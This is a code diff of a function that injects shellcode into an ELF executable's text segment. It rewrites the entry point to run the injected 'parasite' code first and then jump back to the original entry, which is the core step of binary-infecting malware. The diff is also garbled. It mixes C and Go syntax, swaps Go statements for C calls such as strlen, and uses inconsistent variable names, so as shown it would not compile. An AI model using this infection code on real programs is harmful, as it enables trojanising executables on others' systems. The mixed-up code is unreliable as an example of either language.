@@ -24,23 +24,20 @@ int binject_ELF(char *file,char *shellcode,int method)
            {
             if(after_text_segment)
             {page_offset+=page_size;}
-             else if p.Type == elf.PT_LOAD && p.Flags == (elf.PF_R|elf.PF_X) {
+             else if (p.Type == elf.PT_LOAD && p.Flags == (elf.PF_R|elf.PF_X)) {
 			// 1. Locate the text segment program header
 			// -Modify the entry point of the ELF header to point to the new code (p_vaddr + p_filesz)
-			originalEntry := elfFile.FileHeader.Entry
+			originalEntry = elfFile.FileHeader.Entry
 			elfFile.FileHeader.Entry = p.Vaddr + p.Filesz
 
 			// 7. Patch the insertion code (parasite) to jump to the entry point (original)
 			scAddr = p.Vaddr + p.Filesz
 			shellcode = api.ApplySuffixJmpIntel64(userShellCode, uint32(scAddr), uint32(originalEntry), elfFile.ByteOrder)
 
-			sclen = uint64(len(shellcode))
-			log.Println("Shellcode Length: ", sclen)
-
-			// -Increase p_filesz to account for the new code (parasite)
-			p.Filesz += sclen
+			
+			p.Filesz += strlen(shellcode)
 			// -Increase p_memsz to account for the new code (parasite)
-			p.Memsz += sclen
+			p.Memsz += strlen(shellcode)
 
 			afterTextSegment = true
 		}
